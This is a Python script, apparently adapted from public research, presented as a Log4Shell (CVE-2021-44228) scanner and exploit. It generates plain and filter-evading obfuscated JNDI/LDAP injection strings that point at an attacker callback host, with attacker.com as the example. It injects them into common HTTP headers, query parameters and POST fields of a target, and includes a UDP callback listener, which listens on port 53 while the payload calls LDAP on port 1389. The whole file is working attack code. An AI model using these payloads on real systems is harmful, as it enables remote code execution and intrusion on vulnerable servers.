#!/usr/bin/env python3
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Based on public research and exploits for CVE-2021-44228
# Original vulnerability discovered by:
#  Chen Zhaojun of Alibaba Cloud Security Team
#
# Exploit adapted for repository by:
#  Hyperion Gray Security Research Team
#

"""
Log4Shell (CVE-2021-44228) JNDI Remote Code Execution Scanner and Exploit

This tool scans for and exploits the Log4Shell vulnerability in Apache Log4j.
The vulnerability allows remote code execution via JNDI injection in log messages.

Affected versions:
- Apache Log4j 2.0-beta9 through 2.14.1
- Apache Log4j 2.15.0 (partial fix, still vulnerable to DoS)

The exploit works by injecting a JNDI lookup string into any field that gets logged
by the vulnerable application. The JNDI lookup causes the application to fetch and
execute arbitrary Java code from an attacker-controlled LDAP or RMI server.
"""

import argparse
import requests
import sys
import socket
from urllib.parse import quote
import warnings

# Suppress SSL warnings
warnings.filterwarnings("ignore")
requests.packages.urllib3.disable_warnings()


# Common HTTP headers that are often logged
COMMON_HEADERS = [
    'User-Agent',
    'Referer',
    'X-Forwarded-For',
    'X-Real-IP',
    'X-Api-Version',
    'X-Requested-With',
    'Accept-Language',
    'Cookie',
]

# Common POST parameters that might be logged
COMMON_PARAMS = [
    'username',
    'user',
    'email',
    'search',
    'q',
    'query',
    'name',
    'message',
    'comment',
]


def generate_payload(callback_host, callback_port=None):
    """
    Generate a JNDI injection payload.
    
    Args:
        callback_host: The attacker's server hostname or IP
        callback_port: Optional port for the LDAP/RMI server (default: 1389 for LDAP)
        
    Returns:
        JNDI injection string
    """
    if callback_port:
        return f"${{jndi:ldap://{callback_host}:{callback_port}/Exploit}}"
    else:
        return f"${{jndi:ldap://{callback_host}:1389/Exploit}}"


def generate_obfuscated_payload(callback_host, callback_port=None):
    """
    Generate an obfuscated JNDI injection payload to bypass basic filters.
    
    Args:
        callback_host: The attacker's server hostname or IP
        callback_port: Optional port for the LDAP/RMI server
        
    Returns:
        Obfuscated JNDI injection string
    """
    # Using variable resolution to obfuscate the payload
    if callback_port:
        target = f"{callback_host}:{callback_port}/Exploit"
    else:
        target = f"{callback_host}:1389/Exploit"
    
    # Obfuscation techniques to bypass simple filters
    payload = f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{target}}}"
    return payload


def scan_target(target_url, callback_host, callback_port=None, use_obfuscation=False):
    """
    Scan a target URL for Log4Shell vulnerability.
    
    Args:
        target_url: The target application URL to test
        callback_host: The attacker's callback server
        callback_port: Optional callback port
        use_obfuscation: Whether to use obfuscated payloads
        
    Returns:
        True if vulnerable (callback received), False otherwise
    """
    print(f"[*] Scanning target: {target_url}")
    
    # Generate payload
    if use_obfuscation:
        payload = generate_obfuscated_payload(callback_host, callback_port)
        print(f"[*] Using obfuscated payload")
    else:
        payload = generate_payload(callback_host, callback_port)
    
    print(f"[*] Payload: {payload}")
    
    session = requests.Session()
    session.verify = False
    
    # Try injecting into headers
    print(f"[*] Testing common HTTP headers...")
    for header in COMMON_HEADERS:
        try:
            headers = {header: payload}
            response = session.get(target_url, headers=headers, timeout=5)
            print(f"    - Tested {header}: HTTP {response.status_code}")
        except requests.exceptions.RequestException:
            pass
    
    # Try injecting into URL parameters
    print(f"[*] Testing URL parameters...")
    try:
        response = session.get(f"{target_url}?test={quote(payload)}", timeout=5)
        print(f"    - Tested query parameter: HTTP {response.status_code}")
    except requests.exceptions.RequestException:
        pass
    
    # Try injecting into POST parameters
    print(f"[*] Testing POST parameters...")
    for param in COMMON_PARAMS:
        try:
            data = {param: payload}
            response = session.post(target_url, data=data, timeout=5)
            print(f"    - Tested {param}: HTTP {response.status_code}")
        except requests.exceptions.RequestException:
            pass
    
    print(f"\n[*] Scan complete. Check your callback server for connections.")
    print(f"[*] If you receive a connection at {callback_host}, the target is vulnerable!")
    return True


def start_callback_listener(listen_port=53):
    """
    Start a simple DNS callback listener to detect exploitation attempts.
    
    Args:
        listen_port: Port to listen on (default: 53 for DNS)
    """
    print(f"[*] Starting callback listener on port {listen_port}...")
    print(f"[*] Waiting for incoming connections...")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('0.0.0.0', listen_port))
        
        while True:
            data, addr = sock.recvfrom(1024)
            print(f"\n[+] Callback received from {addr[0]}:{addr[1]}")
            print(f"[+] Data: {data[:100]}")
            print(f"[!] Target appears to be VULNERABLE!")
            
    except KeyboardInterrupt:
        print(f"\n[*] Listener stopped.")
    except PermissionError:
        print(f"[-] Permission denied. Try running with sudo for ports < 1024.")
    except Exception as e:
        print(f"[-] Error: {e}")


def main():
    parser = argparse.ArgumentParser(
        description='CVE-2021-44228 (Log4Shell) Scanner and Exploit',
        epilog='Example: python exploit.py -t http://target.com -c attacker.com'
    )
    
    parser.add_argument(
        '-t', '--target',
        help='Target URL to test (e.g., http://192.168.1.1:8080)'
    )
    
    parser.add_argument(
        '-c', '--callback',
        help='Callback server hostname or IP (your server)'
    )
    
    parser.add_argument(
        '-p', '--port',
        type=int,
        help='Callback server port (default: 1389 for LDAP)'
    )
    
    parser.add_argument(
        '-o', '--obfuscate',
        action='store_true',
        help='Use obfuscated payload to bypass filters'
    )
    
    parser.add_argument(
        '-l', '--listen',
        action='store_true',
        help='Start a callback listener instead of scanning'
    )
    
    parser.add_argument(
        '--listen-port',
        type=int,
        default=53,
        help='Port for callback listener (default: 53)'
    )
    
    args = parser.parse_args()
    
    print("\n" + "="*70)
    print("  CVE-2021-44228 (Log4Shell) Scanner and Exploit")
    print("  Apache Log4j Remote Code Execution via JNDI Injection")
    print("="*70 + "\n")
    
    if args.listen:
        # Start callback listener mode
        start_callback_listener(args.listen_port)
    elif args.target and args.callback:
        # Scan mode
        scan_target(args.target, args.callback, args.port, args.obfuscate)
    else:
        parser.print_help()
        print("\n[!] Either specify -t and -c for scanning, or -l for listening")
        sys.exit(1)


if __name__ == '__main__':
    main()
